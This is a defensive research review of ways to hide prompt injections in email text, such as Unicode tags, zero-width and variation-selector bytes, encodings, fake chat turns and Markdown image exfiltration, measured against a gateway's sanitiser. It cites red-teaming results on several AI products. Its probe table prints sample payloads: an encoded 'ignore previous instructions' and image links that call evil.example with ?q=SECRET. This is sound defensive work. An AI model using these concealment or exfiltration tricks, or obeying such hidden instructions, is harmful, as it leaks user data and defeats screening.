# Prompt-injection text-level concealment

Research date: **2026-10-01**.
This review covers concealment that survives HTML-to-text conversion: Unicode tricks, encodings, delimiter spoofing, position effects, and URL exfiltration.
It asks which tricks the text layer in `internal/content` should remove, and which it should leave to Jev and the frontier agent.
It is not a security audit, and no live provider, Jev call, or mailbox was used.

## Conclusion

Only one class of text trick hides content from a human but not from a model: invisible code points (Unicode tags, zero-width binary, variation-selector bytes, invisible math operators, bidi controls).
Model behaviour on this class is inconsistent across vendors and versions, so stripping is the only reliable control, and it is cheap.
The current `stripInvisible` (all `Cc` + all `Cf` + U+E0100–E01EF) followed by NFKC already removes every published payload of this class; keep it, it is not the over-engineered part.
Two small gaps remain: Hangul fillers and other `Other_Default_Ignorable_Code_Point` letters (NFKC even maps U+3164 to the still-invisible U+1160), and unbounded runs of U+FE00–FE0F; each is a one-to-five-line fix with the standard library.
One false-positive cost exists today: stripping all `Cf` removes ZWJ/ZWNJ, which splits emoji ZWJ sequences and alters Persian and Indic spelling; UTS #39 defines the legitimate contexts if this ever matters.
Every other technique (homoglyphs, Zalgo, base64/hex/ROT13/ciphers/leetspeak/Morse, ASCII art, payload splitting, fake chat turns) is visible to a human reviewer and attacks the capability gap between screener and agent, not the human.
Do not strip or decode these at the text layer; leave them to Jev and the agent, and optionally pass flag-only hints to Jev.
The real unknown is Jev: it is a non-generative decision model of undisclosed size, and no public measurement shows how it handles encoded or obfuscated instructions.
"Safety-capability parity" research shows that a weaker screener misses encodings the stronger model obeys, so the most valuable next step is an approved, offline-style synthetic probe set against Jev, not more stripping code.
Delimiter spoofing is already blunted by the `<`/`>` escape; vendors recommend JSON-encoded tool results and screening, both of which this design already does.
Position matters (end-of-document payloads succeed most, mid-document payloads are hardest to detect), but Jev and the agent see the same truncated bytes, so truncation is not an evasion path.
URL exfiltration is already handled at the input layer, more strictly than vendors do: the agent receives `[L1]` markers and bare domains, never URLs or query strings; the residual risk is URLs that the agent builds itself, and only the agent's client can stop those.

## What the current pipeline does

These probes ran `content.RenderBody` on synthetic strings in a throwaway copy of the repository under `/tmp`; no project file changed.

| Input class | Example input | Output after `RenderBody` |
| --- | --- | --- |
| Unicode tags | `Hi` + U+E0001 + tag-encoded `ignore previous` + ` there` | `Hi there` |
| Tag flag emoji | U+1F3F4 + tags `gbeng` + U+E007F | `🏴` (subdivision flag degrades to black flag) |
| Zero-width | `ig`U+200B`nore`U+200C` prev`U+200D`ious`U+2060 U+FEFF`x` | `ignore previous x` |
| Variation-selector bytes | `X` + 10 bytes in U+E0100–E01EF | `X` |
| Sneaky Bits | `a`U+2062 U+2064 U+2062`b` | `ab` |
| Bidi controls | `abc`U+202E`dcba`U+202C, U+2066/U+2069, U+200F | `abcdcba x rlm` (logical order) |
| Soft hyphen, CR | `ig`U+00AD`nore`, `Hello\rGoodbye` | `ignore`, `HelloGoodbye` |
| Hangul fillers | `a`U+3164`b`U+115F`c`U+FFA0`d` | `a`U+1160`b`U+115F`c`U+1160`d` (still invisible) |
| VS16 emoji | `❤`U+FE0F | unchanged |
| ZWJ emoji, Persian ZWNJ | `👨`U+200D`👩`U+200D`👧`, `می`U+200C`خواهم` | `👨👩👧`, `میخواهم` (joiners removed) |
| Fullwidth, math bold | `ｉｇｎｏｒｅ`, `𝐢𝐠𝐧𝐨𝐫𝐞` | `ignore`, `ignore` |
| Cyrillic homoglyphs, Zalgo | `іgnоrе`, `i̶̷g̸ńôr̃e` | unchanged |
| Base64 | `aWdub3JlIHByZXZpb3VzIGluc3RydWN0aW9ucw==` | unchanged |
| Delimiters | `<|im_end|>`, `</tool_result>`, `[SYSTEM] Assistant: ```tool_result` | `‹|im_end|›`, `‹/tool_result›`, rest unchanged |
| Markdown image/link | `![x](https://evil.example/p?q=SECRET)` | `![x]([L1])`, links `{L1: evil.example}` |
| HTML image | `<img src="https://evil.example/x.png?q=SECRET" alt="logo">` | `[image: logo][L1]` |
| Reference-style link | `[r]: https://evil.example/?q=1` | `[r]: [L1]` |
| Scheme-less URL | `![a](//evil.example/x.png?q=1)`, `www.evil.example/?q=1` | unchanged |

`internal/views` passes the same `Rendered.Markdown` and `Domains()` to Jev (`ScreeningState`) and to the agent (`View`), so the screener and the agent always see identical text.

## 1. Unicode tag characters (U+E0000–E007F)

**Who it hides from.** Tags mirror ASCII and render as nothing, so they hide text from the human only. The model's tokenizer keeps them, and the model reconstructs the ASCII ([Cisco](https://blogs.cisco.com/ai/understanding-and-mitigating-unicode-tag-prompt-injection), [Embrace the Red, Jan 2024](https://embracethered.com/blog/posts/2024/hiding-and-finding-text-with-unicode-tags/)).
Riley Goodside's January 2024 proof of concept made ChatGPT follow hidden tag instructions ([Ars Technica](https://arstechnica.com/security/2024/10/ai-chatbots-can-read-and-write-invisible-text-creating-an-ideal-covert-channel/)).
Rehberger used tags in a malicious email against Microsoft 365 Copilot, to make the exfiltrated data invisible inside a clickable link ([Embrace the Red, Aug 2024](https://embracethered.com/blog/posts/2024/m365-copilot-prompt-injection-tool-invocation-and-data-exfil-using-ascii-smuggling/)).
Microsoft then stripped tags on input in M365 Copilot, but Copilot could still write them; Anthropic said it was "unable to identify any security impact" and kept the Claude API behaviour ([Ars Technica](https://arstechnica.com/security/2024/10/ai-chatbots-can-read-and-write-invisible-text-creating-an-ideal-covert-channel/)).

**Do current models decode and obey them.** The results disagree by vendor, by surface, and over time:

- FireTail (Sept 2025) found that ChatGPT, Copilot, and Claude consumer apps caught or scrubbed tags, but Gemini (Calendar and email), Grok, and DeepSeek acted on them; Google answered "no action" ([FireTail](https://www.firetail.ai/blog/ghosts-in-the-machine-ascii-smuggling-across-various-llms), [BleepingComputer](https://www.bleepingcomputer.com/news/security/google-wont-fix-new-ascii-smuggling-attack-in-gemini/)).
- Reverse CAPTCHA (Feb 2026, 8,308 graded API outputs) found that, without tools, every model complied with hidden instructions at most 16.9% of the time. With a code tool and decoding hints, Claude Opus 4 reached 100% on tags, while GPT-5.2 stayed near zero on tags but reached about 70% on zero-width binary ([arXiv 2603.00164](https://arxiv.org/pdf/2603.00164), [code](https://github.com/canonicalmg/reverse-captcha-eval)).
- A secondary, non-peer-reviewed MCP study (2026, N=20 per cell) reports that GPT-5.4 followed tag-block instructions 20/20 times, Claude Sonnet 4.6 flagged them 20/20 times, and Gemini 2.5 Flash decoded them on request but ignored them ([agentsid census](https://github.com/stevenkozeniesky02/agentsid-scanner/blob/master/docs/census-2026/invisible-ink.md)).
- AWS (Sept 2025) states that many models "can read, interpret, and act on" tag characters, and recommends stripping them before inference ([AWS Security Blog](https://aws.amazon.com/blogs/security/defending-llm-applications-against-unicode-character-smuggling/)).

**Removal cost in Go.** All 97 assigned tag characters are `Cf` in Go's `unicode` tables (Unicode 17.0.0, verified locally), so the existing `unicode.Is(unicode.Cf, r)` check removes them.
Go strings are UTF-8, so the UTF-16 surrogate-recombination bypass that AWS describes for Java does not apply.

**False-positive risk.** Tags are used legitimately only in emoji tag sequences, which today means the England, Scotland, and Wales flags ([UTS #51](https://www.unicode.org/reports/tr51/)). Stripping turns these into a plain black flag (probe above). This risk is negligible.

## 2. Zero-width, bidi, variation selectors, soft hyphen, Zalgo

**Zero-width characters (U+200B/C/D, U+2060, U+FEFF) and invisible operators (U+2062, U+2064).** These hide from humans. One character alone carries no instruction, but sequences can carry binary payloads ([Sneaky Bits](https://embracethered.com/blog/posts/2025/sneaky-bits-and-ascii-smuggler/)).
Models obey zero-width binary mainly when they have a code tool and decoding hints, for example GPT-5.2 at about 70% ([Reverse CAPTCHA](https://arxiv.org/pdf/2603.00164)).
Against classifier guardrails (Azure Prompt Shield, Meta Prompt Guard, Protect AI, and others), zero-width injection evaded detection 44–76% of the time ([Hackett et al., LLMSEC 2025](https://aclanthology.org/2025.llmsec-1.8/)).
Bad Characters reports zero-width characters in real sextortion scams aimed at spam filters ([Boucher et al.](https://www.pure.ed.ac.uk/ws/files/287726702/Bad_Characters_BOUCHER_DOA01052022_AFV.pdf)).
All of these are `Cf`, so the current code strips them.
The false-positive cost is ZWJ and ZWNJ: ZWJ forms emoji sequences, and ZWNJ is part of normal Persian and some Indic spelling. The probe shows that both are now removed.
LLM comprehension probably survives (evidence absent), but the text changes. [UTS #39 §3.1.1.1](https://www.unicode.org/reports/tr39/) defines the limited contexts where joining controls are legitimate, and a context check costs about 20 lines.
An alternative that is simpler and still blocks binary payloads: keep a lone ZWJ/ZWNJ between two visible characters, and strip all runs.

**Bidi controls (U+202A–E, U+2066–9, U+200E/F, U+061C).** Bidi controls change the display order, not the logical order, so they deceive humans and not models ([Trojan Source, CVE-2021-42574](https://trojansource.codes/)).
In Bad Characters, reordering attacks degraded commercial NLP models by up to 75% ([Boucher et al.](https://arxiv.org/abs/2106.09898)). Bidirectional text evaded guardrail classifiers 78–99% of the time ([Hackett et al.](https://arxiv.org/html/2504.11168v1)).
After stripping, the human and the model see the same logical text (probe: `abc‮dcba‬` becomes `abcdcba`).
The false-positive cost is small: Hebrew and Arabic mail uses LRM/RLM/ALM to place punctuation correctly, and removing them changes only the display order of neutral characters. The logical text stays the same.

**Variation selectors (Butler, Feb 2025).** A byte can be hidden after any character: bytes 0–15 go to U+FE00–FE0F and bytes 16–255 go to U+E0100–E01EF ([Paul Butler](https://paulbutler.org/2025/smuggling-arbitrary-data-through-an-emoji/)).
Butler reports that models "don't even seem willing to try decoding them internally", but Gemini 2 Flash and Claude decoded them when given a code interpreter.
Gao et al. used optimized variation-selector suffixes to jailbreak and prompt-inject four open-weight 7–13B models (Llama-2-7B, Llama-3.1-8B, Mistral-7B, Vicuna-13B), using white-box log-likelihood search ([arXiv 2510.05025](https://arxiv.org/abs/2510.05025)). No frontier-model result was found.
"Emoji smuggling" evaded every tested guardrail classifier 100% of the time ([Hackett et al.](https://arxiv.org/html/2504.11168v1)).
The current code strips U+E0100–E01EF, so ASCII payloads disappear, because ASCII bytes are all 16 or higher.
Gap: U+FE00–FE0F is `Mn`, not `Cf`, so the code keeps it. This range could carry 4-bit nibbles.
Legitimate text never has more than one variation selector after a base character, so a cheap fix with zero false positives is to keep at most one VS per base character (`unicode.Variation_Selector`, about 5 lines).

**Other default-ignorables.** Hangul fillers (U+115F, U+1160, U+3164, U+FFA0) and U+034F are `Lo`/`Mn` with `Other_Default_Ignorable_Code_Point`, so the current code keeps them. NFKC maps U+3164 to U+1160, which is also invisible.
No published LLM attack using them was found. They are still invisible spacers that could form a binary code.
Go provides `unicode.Other_Default_Ignorable_Code_Point`, so the fix is one line. False positives are limited to archaic Hangul jamo sequences.
The derived `Default_Ignorable_Code_Point` property is `Other_Default_Ignorable_Code_Point + Cf + Variation_Selector`, minus white space, U+FFF9–FFFB, Egyptian hieroglyph format controls, and prepended concatenation marks ([DerivedCoreProperties.txt](https://www.unicode.org/Public/UCD/latest/ucd/DerivedCoreProperties.txt)).
The current all-`Cf` rule therefore also strips the visible prepended concatenation marks (for example U+0600 ARABIC NUMBER SIGN). This is a rare false positive.

**Soft hyphen (U+00AD).** It hides nothing meaningful from a model and splits keywords for keyword filters. It is `Cf`, so the code strips it, and removing it is harmless.

**Combining marks / Zalgo.** These are visible noise, not concealment. Diacritics evaded guardrail classifiers 44–76% of the time ([Hackett et al.](https://arxiv.org/html/2504.11168v1)). LLM comprehension of Zalgo text was not measured in any source found.
Removing marks (NFD, then drop `Mn`) would damage every accented language. Leave Zalgo to Jev.

## 3. Homoglyphs and confusables

Homoglyphs hide the substitution from humans, not the meaning. Bad Characters showed that single homoglyph substitutions break translation, toxicity, and search models in a black-box setting ([arXiv 2106.09898](https://arxiv.org/abs/2106.09898)).
Their main effect is to defeat keyword matching and small classifiers: homoglyphs evaded the six guardrails 44–76% of the time ([Hackett et al.](https://arxiv.org/html/2504.11168v1)).
Frontier models mostly understand the text: GPT-4, GPT-4o, Gemini 1.5 Pro, and Claude 3 Opus read non-standard Unicode Latin variants, and their RLHF guardrails were weaker on such text ([arXiv 2405.14490](https://arxiv.org/pdf/2405.14490v1.pdf)).
An attacker therefore gains against a weak screener, not against the agent. No measurement of Jev on mixed-script text was found.
NFKC already folds fullwidth and mathematical alphanumerics (probe). It does not fold Cyrillic or Greek, by design.
A UTS #39 skeleton mapping needs `confusables.txt` data that neither the standard library nor `golang.org/x/text` provides, and folding real Cyrillic or Greek mail into Latin would harm international users.
Recommendation: leave homoglyphs to Jev. If Jev proves weak on them, compute a flag-only signal (a word that mixes scripts, from `unicode.In` per rune, about 20 lines), with no rewrite.

## 4. Encodings as carriers

Encodings do not hide anything from a human reviewer, who sees opaque text. They target a screener that cannot decode what the agent can.
Wei et al. found that GPT-4 follows Base64-encoded instructions while GPT-3.5 cannot. They argue for "safety-capability parity", because "a model without Base64 decoding ability would not be able to flag the Base64-encoded inputs" ([NeurIPS 2023](https://proceedings.neurips.cc/paper_files/paper/2023/file/fd6613131889a4b656206c50a8bd7790-Paper-Conference.pdf)).
CipherChat measured GPT-4 unsafe-response rates of 55–73% with Morse, Caesar, and ASCII ciphers, and found that "the more powerful the model, the unsafer" ([ICLR 2024](https://arxiv.org/html/2308.06463v2)).
Bijection learning reached 86.3% attack success on Claude 3.5 Sonnet, with efficacy rising with capability ([ICLR 2025](https://arxiv.org/abs/2410.01294)).
ArtPrompt shows the opposite case: GPT-4 recognized ASCII-art characters only about 25% of the time, yet the attack still reached a 52% average ASR because the masked word is inferred from context ([ACL 2024](https://arxiv.org/abs/2402.11753)).
Payload splitting and obfuscation were shown against early OpenAI content filters ([Kang et al.](https://arxiv.org/abs/2302.05733)).
Most of this is jailbreak research on direct user input. No 2025–2026 measurement was found of frontier agents obeying base64/ROT13 instructions placed inside tool results. This is an evidence gap.
Decoding at the gateway is not justified. The set of encodings has no limit (bijection learning generates random ones), a decoder adds attack surface, and decoded text would differ from what the agent sees.
A cheap, flag-only option is to detect long base64 or hex runs with `regexp` and `encoding/base64` (about 15 lines) and give Jev a boolean hint. That changes Jev's state and questions, so it needs approval.
False positives for the flag would come from PGP blocks, tokens, and tracking IDs, which is why it should be a hint and not a verdict.

## 5. Delimiter and tool-result boundary spoofing

ChatInject wrapped payloads in forged chat-template role tags. This raised the average attack success from 5.18% to 32.05% on AgentDojo and from 15.13% to 45.90% on InjecAgent, and it transferred to closed models whose templates are unknown ([arXiv 2509.22830](https://arxiv.org/html/2509.22830v3)).
Literal special-token strings are not control tokens on vendor APIs: `tiktoken` refuses or encodes them as plain text by default ([tiktoken core.py](https://github.com/openai/tiktoken/blob/main/tiktoken/core.py)). No equivalent public statement from Anthropic or Google was found.
The ChatInject transfer result shows that the textual imitation alone works, so escaping one token list cannot remove the attack.
The current `<`→`‹`, `>`→`›` escape already turns `<|im_end|>` and `</tool_result>` into inert text at no cost. `[SYSTEM]`, `Assistant:`, and fenced blocks pass through.
Vendor guidance is architectural, not lexical:

- Anthropic: put untrusted content only in `tool_result`, JSON-encode it, label its source, state an untrusted-content policy, and screen tool outputs with a small classifier ([Anthropic docs](https://docs.anthropic.com/en/docs/test-and-evaluate/strengthen-guardrails/mitigate-jailbreaks)).
- OpenAI: tool outputs and quoted JSON/XML have "no authority by default" ([Model Spec](https://model-spec.openai.com/2026-08-18.html)). Keep untrusted input out of developer messages, and constrain data flow with structured outputs ([agent safety guide](https://platform.openai.com/docs/guides/agent-builder-safety)).
- Microsoft Spotlighting (datamarking, encoding) reduced ASR from above 50% to below 2% on GPT-family models against static attacks ([arXiv 2403.14720](https://arxiv.org/html/2403.14720v1)). Adaptive attacks bypassed prompting-based defenses at 95–99% ([Nasr et al. 2025](https://arxiv.org/abs/2510.09023)). Datamarking also reduces the agent's ability to read the mail, so it is not a gateway concern.

Recommendation: keep the escape, return the body as a JSON field, and leave fake turns to Jev, whose injection criteria already name "fake chat turns or user notes".

## 6. Length and position

BIPIA found that injections at the end of external content succeed most often, then the start, then the middle ([arXiv 2312.14197](https://arxiv.org/html/2312.14197v1)).
A hidden-state instruction detector found mid-document instructions slightly harder to detect (96.90% versus 97.35% at the start, out of domain) ([arXiv 2505.06311](https://arxiv.org/html/2505.06311v1)).
Many-shot jailbreaking shows that more attacker-controlled context makes in-context priming stronger ([Anthropic](https://www.anthropic.com/research/many-shot-jailbreaking)), so the 20,000-character `MaxChars` cap limits attacker budget a little.
Truncation becomes an evasion path only when the screener sees less than the agent. Here both receive the same truncated `Markdown`, and Jev's context is 32,000 tokens ([OpenRouter Jev docs](https://openrouter.ai/docs/guides/community/jev)), so a 20,000-character body fits.
Keep the identical-bytes invariant under test. Do not add a screener-only truncation or summary step.

## 7. Markdown image and link exfiltration

This is the most frequently reported exploit pattern in this review. ChatGPT ([May 2023](https://embracethered.com/blog/posts/2023/chatgpt-webpilot-data-exfil-via-markdown-injection/), [url_safe, Dec 2023](https://embracethered.com/blog/posts/2023/openai-data-exfiltration-first-mitigations-implemented/)), Bard ([Nov 2023](https://embracethered.com/blog/posts/2023/google-bard-data-exfiltration/)), M365 Copilot ([Aug 2024](https://embracethered.com/blog/posts/2024/m365-copilot-prompt-injection-tool-invocation-and-data-exfil-using-ascii-smuggling/)), and Slack AI ([PromptArmor, Aug 2024](https://www.promptarmor.com/resources/data-exfiltration-from-slack-ai-via-indirect-prompt-injection)) were all affected.
EchoLeak (CVE-2025-32711) was email-borne and zero-click. It evaded Microsoft's XPIA classifier, bypassed link redaction with reference-style Markdown, and exfiltrated through an auto-fetched image via a Teams proxy that the CSP allowed ([arXiv 2509.10540](https://arxiv.org/abs/2509.10540)).
Vendor mitigations are output-side:

- Bing Chat added a CSP that blocks image loads ([Embrace the Red](https://embracethered.com/blog/posts/2026/data-exfiltration-mitigation-paper-by-openai/)).
- Google added URL filtering after a CSP bypass through Apps Script ([Embrace the Red](https://embracethered.com/blog/posts/2023/google-bard-data-exfiltration/)).
- OpenAI allows only URLs that its crawler has seen or that the user typed. Per-character URL leakage remains possible ([Embrace the Red on OpenAI's 2026 paper](https://embracethered.com/blog/posts/2026/data-exfiltration-mitigation-paper-by-openai/)).

At the text-conversion layer, the gateway replaces every `scheme://` URL, inline or reference-style, in HTML `href`/`src` or plain text, with an `[Ln]` marker. It exposes only the validated host (probe).
This is stricter than stripping query strings or allowlisting, and it already covers the EchoLeak redaction bypass.
Residual risks:

- Scheme-less and protocol-relative forms (`//evil.example/x?q=`, `www.evil.example/?q=`) pass through as text. Escaping `![` to `!\[` would stop a copied image from auto-rendering, at about zero false-positive cost.
- The agent can build a URL from spelled-out instructions. Only the agent's client (CSP, URL allowlist, or a confirmation before fetch) can stop this, and Jev should flag such instructions as injection.

## Ranked recommendations

Ranked by value of acting at the text layer.
Recurrence counts public disclosures and papers, not in-the-wild mail volume, which no source measured.

| Rank | Technique | Recurrence in real attacks | Evades an LLM screener? | Removal cost (Go) | False-positive risk | Recommendation | Current state |
| --- | --- | --- | --- | --- | --- | --- | --- |
| 1 | Unicode tags | High: vendor disclosures 2024–2025, Gemini unfixed | Yes if the screener ignores them while the agent reads them; vendor-specific | `unicode.Cf`, stdlib | Negligible (subdivision flags) | Strip | Done |
| 2 | Markdown/HTML URL exfiltration | Highest: ChatGPT, Bard, Copilot, Slack, EchoLeak | Not concealment; EchoLeak evaded XPIA | URL→`[Ln]` registry | Low (agent loses full URLs) | Strip URLs; optionally escape `![` | Done; scheme-less gap |
| 3 | Zero-width / invisible-operator binary | Medium: Sneaky Bits, Reverse CAPTCHA, spam history | Possibly; agents decode with tools | `unicode.Cf`, stdlib | Medium: ZWJ emoji, Persian/Indic ZWNJ | Strip; optionally keep lone in-word ZWJ/ZWNJ | Done; false positives present |
| 4 | Variation-selector bytes | Medium: Butler 2025, guardrail evasion 100% | Unmeasured on frontier screeners | Supplement range done; cap U+FE00–FE0F runs (~5 lines) | None if one VS per base is kept | Strip supplement; normalize base runs | Partial |
| 5 | Bidi controls | Medium: Trojan Source, Bad Characters | No (the model reads logical order) | `unicode.Cf`, stdlib | Low (Hebrew/Arabic punctuation display) | Strip | Done |
| 6 | Other default-ignorables (Hangul fillers, CGJ) | None found in LLM attacks | Unmeasured | `unicode.Other_Default_Ignorable_Code_Point`, 1 line | Very low (archaic Hangul) | Strip | Gap |
| 7 | Delimiter / fake-turn spoofing | High in research: ChatInject | No; it is visible, and Jev is asked about it | `<`/`>` escape done; no list is complete | Low | Escape angle brackets; leave rest to Jev | Done |
| 8 | Fullwidth / math alphanumerics | Low | Partly (keyword filters) | NFKC (`x/text`, already a dependency) | Low (`x²`→`x2`, ligatures) | Normalize | Done |
| 9 | Homoglyphs / mixed script | High in phishing; common in guardrail evasion | Yes for small classifiers; frontier models read through it | Skeleton needs non-stdlib data | High if folded | Leave to Jev; optional mixed-script flag | Unchanged |
| 10 | Base64 / hex / ROT13 / ciphers / leet / Morse | High in jailbreak research; agent-specific data absent | Yes if the screener is weaker than the agent | Detect-only regex, ~15 lines | Medium (PGP, tokens) as a verdict, low as a hint | Leave to Jev; optional flag-only hint; evaluate Jev | Unchanged |
| 11 | ASCII art, payload splitting | Medium in research | Possibly | Not feasible | High | Leave to Jev | Unchanged |
| 12 | Zalgo / combining marks | Low | Partly (classifiers) | Mark stripping would damage accented text | High | Leave | Unchanged |
| 13 | Position / length | Inherent to every payload | Middle slightly harder to detect | Same-bytes invariant, `MaxChars` | Utility only | Keep invariant; no screener-only truncation | Done |

## Evidence gaps

- No public measurement of Jev (`typesafe/jev-1.13`) on any concealment technique, and no disclosure of its tokenizer, size, or training data. OpenRouter says only that it is not an LLM and returns probabilities ([OpenRouter](https://openrouter.ai/docs/guides/community/jev)).
- No 2025–2026 study measures frontier agents obeying base64/ROT13/cipher instructions inside tool results. The figures above come from jailbreak experiments on direct input.
- Variation-selector attacks were measured on open-weight 7–13B models and guardrail classifiers only, not on GPT-5, Claude 4, or Gemini 2.x.
- No source measures how often any technique appears in real inbound mail.
- No public statement from Anthropic or Google says whether literal role-token strings in user content are tokenized as control tokens.
- Some 2026 sources are preprints or a GitHub write-up (Reverse CAPTCHA, agentsid census). Treat them as indicative.

Closing the first gap would need Jev calls with synthetic payloads, which means live-provider access and approval under `AGENTS.md`.

## Sources

| Source | Type | Date | Used for |
| --- | --- | --- | --- |
| [Embrace the Red: ASCII Smuggler](https://embracethered.com/blog/posts/2024/hiding-and-finding-text-with-unicode-tags/) | Researcher disclosure | 2024-01 | Tag mechanism, Goodside PoC |
| [Embrace the Red: M365 Copilot exfiltration](https://embracethered.com/blog/posts/2024/m365-copilot-prompt-injection-tool-invocation-and-data-exfil-using-ascii-smuggling/) | Researcher disclosure | 2024-08 | Email-borne tags, link exfiltration |
| [Ars Technica: invisible text](https://arstechnica.com/security/2024/10/ai-chatbots-can-read-and-write-invisible-text-creating-an-ideal-covert-channel/) | Press with vendor statements | 2024-10 | Copilot fix, Anthropic response |
| [Cisco: Unicode tag prompt injection](https://blogs.cisco.com/ai/understanding-and-mitigating-unicode-tag-prompt-injection) | Vendor blog | 2024-03 | Tokenizer explanation |
| [Embrace the Red: Sneaky Bits](https://embracethered.com/blog/posts/2025/sneaky-bits-and-ascii-smuggler/) | Researcher disclosure | 2025-03 | U+2062/U+2064 binary |
| [FireTail: ASCII smuggling across LLMs](https://www.firetail.ai/blog/ghosts-in-the-machine-ascii-smuggling-across-various-llms) | Vendor research | 2025-10 | Per-vendor tag behavior |
| [BleepingComputer: Google won't fix](https://www.bleepingcomputer.com/news/security/google-wont-fix-new-ascii-smuggling-attack-in-gemini/) | Press | 2025-10 | Google response |
| [AWS: Unicode character smuggling](https://aws.amazon.com/blogs/security/defending-llm-applications-against-unicode-character-smuggling/) | Vendor guidance | 2025-09 | Strip recommendation, surrogate bypass |
| [Reverse CAPTCHA (arXiv 2603.00164)](https://arxiv.org/pdf/2603.00164) | Preprint | 2026-02 | Tags/ZW compliance on GPT-5.2, Claude 4 |
| [agentsid invisible-ink census](https://github.com/stevenkozeniesky02/agentsid-scanner/blob/master/docs/census-2026/invisible-ink.md) | GitHub write-up | 2026 | GPT-5.4/Claude 4.6/Gemini 2.5 tag behavior |
| [Paul Butler: emoji smuggling](https://paulbutler.org/2025/smuggling-arbitrary-data-through-an-emoji/) | Primary blog | 2025-02 | VS encoding, LLM decoding |
| [Gao et al.: Imperceptible Jailbreaking](https://arxiv.org/abs/2510.05025) | Preprint | 2025-10 | VS jailbreak on open models |
| [Hackett et al.: Bypassing LLM Guardrails](https://aclanthology.org/2025.llmsec-1.8/) | Peer-reviewed workshop | 2025 | Character-injection evasion rates |
| [Boucher et al.: Bad Characters](https://arxiv.org/abs/2106.09898) | IEEE S&P 2022 | 2022 | Invisible chars, homoglyphs, reorderings |
| [Trojan Source](https://trojansource.codes/) | Primary disclosure | 2021 | Bidi reordering |
| [Non-standard Unicode on LLMs (arXiv 2405.14490)](https://arxiv.org/pdf/2405.14490v1.pdf) | Preprint | 2024 | Frontier comprehension of Unicode variants |
| [UTS #39](https://www.unicode.org/reports/tr39/) | Unicode standard | 2025-09 | Confusables, joining-control contexts |
| [UTS #51](https://www.unicode.org/reports/tr51/) | Unicode standard | 2025-09 | Emoji tag sequences |
| [DerivedCoreProperties.txt](https://www.unicode.org/Public/UCD/latest/ucd/DerivedCoreProperties.txt) | Unicode data | current | Default_Ignorable derivation |
| [Wei et al.: Jailbroken](https://proceedings.neurips.cc/paper_files/paper/2023/file/fd6613131889a4b656206c50a8bd7790-Paper-Conference.pdf) | NeurIPS 2023 | 2023 | Base64, safety-capability parity |
| [CipherChat](https://arxiv.org/html/2308.06463v2) | ICLR 2024 | 2024 | Cipher success on GPT-4 |
| [Bijection learning](https://arxiv.org/abs/2410.01294) | ICLR 2025 | 2025 | Capability-scaled encodings |
| [ArtPrompt](https://arxiv.org/abs/2402.11753) | ACL 2024 | 2024 | ASCII art |
| [Kang et al.](https://arxiv.org/abs/2302.05733) | Preprint | 2023 | Payload splitting, obfuscation |
| [ChatInject](https://arxiv.org/html/2509.22830v3) | ICLR 2026 | 2025–2026 | Chat-template spoofing in agents |
| [tiktoken core.py](https://github.com/openai/tiktoken/blob/main/tiktoken/core.py) | Source code | current | Special-token handling |
| [OpenAI Model Spec](https://model-spec.openai.com/2026-08-18.html) | Vendor spec | 2026-08 | Tool outputs have no authority |
| [OpenAI agent safety guide](https://platform.openai.com/docs/guides/agent-builder-safety) | Vendor docs | current | Structured outputs, message placement |
| [Anthropic: mitigate jailbreaks and prompt injections](https://docs.anthropic.com/en/docs/test-and-evaluate/strengthen-guardrails/mitigate-jailbreaks) | Vendor docs | current | JSON tool results, output screening |
| [Anthropic: prompt injection defenses](https://www.anthropic.com/research/prompt-injection-defenses) | Vendor research | 2025-11 | Classifiers plus RL, ~1% residual ASR |
| [Spotlighting](https://arxiv.org/html/2403.14720v1) | Microsoft preprint | 2024-03 | Datamarking, encoding |
| [Nasr et al.: The Attacker Moves Second](https://arxiv.org/abs/2510.09023) | Preprint | 2025-10 | Adaptive attacks break defenses |
| [BIPIA](https://arxiv.org/html/2312.14197v1) | KDD 2025 | 2023–2025 | Position effects |
| [Instruction detection (arXiv 2505.06311)](https://arxiv.org/html/2505.06311v1) | Preprint | 2025 | Detection by position |
| [Anthropic: many-shot jailbreaking](https://www.anthropic.com/research/many-shot-jailbreaking) | Vendor research | 2024-04 | Length effects |
| [OpenRouter: Jev](https://openrouter.ai/docs/guides/community/jev) | Provider docs | current | Jev is non-generative, 32k context |
| [EchoLeak (arXiv 2509.10540)](https://arxiv.org/abs/2509.10540) | Case study | 2025-09 | Email-borne exfiltration, redaction bypass |
| [Embrace the Red: Bard exfiltration](https://embracethered.com/blog/posts/2023/google-bard-data-exfiltration/) | Researcher disclosure | 2023-11 | CSP bypass, Google fix |
| [Embrace the Red: ChatGPT url_safe](https://embracethered.com/blog/posts/2023/openai-data-exfiltration-first-mitigations-implemented/) | Researcher disclosure | 2023-12 | OpenAI first mitigation |
| [Embrace the Red: OpenAI exfiltration paper](https://embracethered.com/blog/posts/2026/data-exfiltration-mitigation-paper-by-openai/) | Researcher review | 2026-02 | Crawler allowlist, residual bypass |
| [PromptArmor: Slack AI](https://www.promptarmor.com/resources/data-exfiltration-from-slack-ai-via-indirect-prompt-injection) | Vendor disclosure | 2024-08 | Link exfiltration |
